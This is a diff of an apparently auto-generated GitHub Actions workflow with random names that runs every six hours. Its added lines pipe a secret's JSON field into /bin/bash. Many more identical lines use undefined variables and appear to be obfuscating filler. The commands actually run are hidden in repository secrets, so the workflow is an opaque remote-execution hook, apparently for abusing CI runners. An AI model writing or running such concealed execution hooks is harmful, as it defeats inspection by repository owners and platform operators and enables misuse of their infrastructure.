@@ -1,21 +1,33 @@
 name: jiatingqian7584
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
-jobs:  # 24080
+    - cron: '58 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiatingqian7584
         env:
-          qsid26: ${{ secrets.qsid26 }}
+          sif72: ${{ secrets.sif72 }}
         run: |
-          echo $qsid26 | jq -r .m4683 | /bin/bash
-          echo $gx62793 | jq -r .zqb6 | /bin/bash
-          echo $u14 | jq -r .czlwu63972 | /bin/bash
-          echo $ssoh3 | jq -r .qss31649 | /bin/bash
+          echo $sif72 | jq -r .od16 | /bin/bash
+          echo $a3 | jq -r .xmt596 | /bin/bash
+          echo $ylpu96 | jq -r .tlyax569 | /bin/bash
+          echo $fi23378 | jq -r .y69 | /bin/bash
+          echo $iv02173 | jq -r .ecwp3047 | /bin/bash
+          echo $ayjjj37 | jq -r .uvr355 | /bin/bash
+          echo $hyfb519 | jq -r .fobo2981 | /bin/bash
+          echo $rp5 | jq -r .fdhx12 | /bin/bash
+          echo $ipmg2839 | jq -r .m18230 | /bin/bash
+          echo $qvle13506 | jq -r .uh541 | /bin/bash
+          echo $p8565 | jq -r .uhihg42286 | /bin/bash
+          echo $mzj4 | jq -r .o824 | /bin/bash
+          echo $bao233 | jq -r .dwbf0565 | /bin/bash
+          echo $kkgim830 | jq -r .dzhy4495 | /bin/bash
+          echo $bgmz223 | jq -r .xw32 | /bin/bash
+          echo $uhyrd676 | jq -r .ivtt99 | /bin/bash
+          echo $adduc38887 | jq -r .yl0933 | /bin/bash
 
